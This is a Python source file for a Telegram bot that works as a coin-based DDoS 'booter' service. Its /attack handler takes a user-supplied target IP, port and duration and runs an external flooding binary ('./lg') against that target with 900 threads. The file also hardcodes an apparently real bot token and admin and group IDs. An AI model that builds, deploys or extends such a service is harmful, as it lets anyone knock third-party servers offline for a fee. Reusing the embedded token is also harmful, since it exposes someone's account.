import os
import telebot
import subprocess
import datetime
import threading
import asyncio
import time
import logging
import json
from threading import Thread
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

bot = telebot.TeleBot('7828525928:AAGZIUO4QnLsD_ITKGSkfN5NlGP3UZvU1OM')

# Admin user IDs
admin_id = ["7163028849"]

# Allowed group IDs
allowed_group_ids = ["-1002298552334"]  # Replace with your group ID

# File to store user data
USER_DATA_FILE = "users_data.json"

REQUEST_INTERVAL = 1

# Global lock for attack
attack_in_progress = threading.Lock()
loop = asyncio.new_event_loop()

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

# Load user data from JSON file
def load_user_data():
    if os.path.exists(USER_DATA_FILE):
        try:
            with open(USER_DATA_FILE, "r") as file:
                data = json.load(file)
                return data
        except json.JSONDecodeError:
            logging.error("Error loading user data: Invalid JSON format.")
            return {}  # Return an empty dictionary if the file is invalid
        except Exception as e:
            logging.error(f"Unexpected error loading user data: {e}")
            return {}
    else:
        logging.warning("User data file not found. Creating a new one.")
        return {}  # Return an empty dictionary if the file doesn't exist


def save_user_data(data):
    try:
        with open(USER_DATA_FILE, "w") as file:
            json.dump(data, file, indent=4)
    except Exception as e:
        logging.error(f"Error saving user data: {e}")


async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

# Check if the message is from the allowed group
def is_allowed_group(message):
    if str(message.chat.id) in allowed_group_ids:
        return True
    bot.reply_to(message, "🚫 This bot can only be used in specific groups.")
    return False

# Handler for /start command
@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = str(message.from_user.id)
    user_data = load_user_data()

    if user_id not in user_data:
        user_data[user_id] = {"coins": 2000, "registered_on": str(datetime.datetime.now())}
        save_user_data(user_data)
        bot.reply_to(message, "🎉 𝗪𝗲𝗹𝗰𝗼𝗺𝗲! 𝗬𝗼𝘂'𝘃𝗲 𝗿𝗲𝗰𝗲𝗶𝘃𝗲𝗱 𝟮𝟬𝟬𝟬 𝗰𝗼𝗶𝗻𝘀 𝗮𝘀 𝗮 𝗯𝗼𝗻𝘂𝘀!")
    else:
        bot.reply_to(message, "👋 ♥ 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗯𝗮𝗰𝗸!! ♥")

    bot.reply_to(message, f"🆔 𝗬𝗼𝘂𝗿 𝗨𝘀𝗲𝗿 𝗜𝗗: {user_id}\n𝗨𝘀𝗲 /account 𝘁𝗼 𝗰𝗵𝗲𝗰𝗸 𝘆𝗼𝘂𝗿 𝗱𝗲𝘁𝗮𝗶𝗹𝘀.")

# Admin command to add coins
@bot.message_handler(commands=['add'])
def handle_add_coins(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗱𝗼𝗻'𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.")
        return

    try:
        _, uid, coins = message.text.split()
        coins = int(coins)
    except ValueError:
        bot.reply_to(message, "⚠️ 𝗨𝘀𝗮𝗴𝗲: /add <𝘂𝗶𝗱> <𝗰𝗼𝗶𝗻𝘀>")
        return

    user_data = load_user_data()
    if uid not in user_data:
        bot.reply_to(message, f"❌ 𝗨𝘀𝗲𝗿 {uid} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱.")
        return

    user_data[uid]['coins'] += coins
    save_user_data(user_data)
    bot.reply_to(message, f"✅ 𝗔𝗱𝗱𝗲𝗱 {coins} 𝗰𝗼𝗶𝗻𝘀 𝘁𝗼 𝘂𝘀𝗲𝗿 {uid}.\n💰 𝗡𝗲𝘄 𝗯𝗮𝗹𝗮𝗻𝗰𝗲: {user_data[uid]['coins']} 𝗰𝗼𝗶𝗻𝘀.")

# Handler for /account command
@bot.message_handler(commands=['account'])
def handle_account(message):
    user_id = str(message.from_user.id)
    user_data = load_user_data()

    if user_id not in user_data:
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗻𝗲𝗲𝗱 𝘁𝗼 𝗿𝗲𝗴𝗶𝘀𝘁𝗲𝗿 𝗳𝗶𝗿𝘀𝘁 𝗯𝘆 𝘂𝘀𝗶𝗻𝗴 /start.")
        return

    username = message.from_user.username if message.from_user.username else "N/A"
    coins = user_data[user_id]['coins']

    response = (
        f"👤 *Account Information* 👤\n"
        f"🔑 *UserID:* `{user_id}`\n"
        f"📛 *Username:* @{username}\n"
        f"💰 *Coins:* {coins}\n"
    )

    bot.reply_to(message, response, parse_mode="Markdown")

# Attack handler
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    if not is_allowed_group(message):
        return

    user_id = str(message.from_user.id)
    user_data = load_user_data()

    if user_id not in user_data:
        bot.reply_to(message, "🚫 𝗬𝗼𝘂 𝗻𝗲𝗲𝗱 𝘁𝗼 𝗿𝗲𝗴𝗶𝘀𝘁𝗲𝗿 𝗳𝗶𝗿𝘀𝘁 𝗯𝘆 𝘂𝘀𝗶𝗻𝗴 /start.")
        return

    if user_data[user_id]['coins'] < 5:
        bot.reply_to(message, "💸 𝗬𝗼𝘂 𝗱𝗼𝗻'𝘁 𝗵𝗮𝘃𝗲 𝗲𝗻𝗼𝘂𝗴𝗵 𝗰𝗼𝗶𝗻𝘀 𝘁𝗼 𝘀𝘁𝗮𝗿𝘁 𝗮𝗻 𝗮𝘁𝘁𝗮𝗰𝗸.")
        return

    if attack_in_progress.locked():
        bot.reply_to(message, "⚠️ 𝗔𝗻 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁.")
        return

    try:
        _, target, port, duration = message.text.split()
        port, duration = int(port), int(duration)
        if duration > 180:
            bot.reply_to(message, "⏳ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗰𝗮𝗻𝗻𝗼𝘁 𝗲𝘅𝗰𝗲𝗲𝗱 𝟭𝟴𝟬 𝘀𝗲𝗰𝗼𝗻𝗱𝘀.")
            return
    except ValueError:
        bot.reply_to(message, "⚠️ 𝗨𝘀𝗮𝗴𝗲: /attack <𝘁𝗮𝗿𝗴𝗲𝘁> <𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")
        return

    user_data[user_id]['coins'] -= 20
    save_user_data(user_data)

    username = message.from_user.username  # Get the username
    bot.reply_to(message, f"𝗧𝗮𝗿𝗴𝗲𝘁: {target} : {port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration}𝗦𝗲𝗰𝗼𝗻𝗱𝘀\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿 𝗡𝗮𝗺𝗲: @{username}\n\n💰 𝟮𝟬 𝗰𝗼𝗶𝗻𝘀 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗱𝗲𝗱𝘂𝗰𝘁𝗲𝗱 𝗳𝗿𝗼𝗺 𝘆𝗼𝘂𝗿 𝗯𝗮𝗹𝗮𝗻𝗰𝗲.")

    def attack():
        with attack_in_progress:
            try:
                subprocess.run(["./lg", target, str(port), str(duration), "900"], check=True)
                bot.send_message(message.chat.id, "✅ Attack completed successfully.")
            except subprocess.CalledProcessError:
                bot.send_message(message.chat.id, "❌ Attack failed.")

    threading.Thread(target=attack).start()



if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
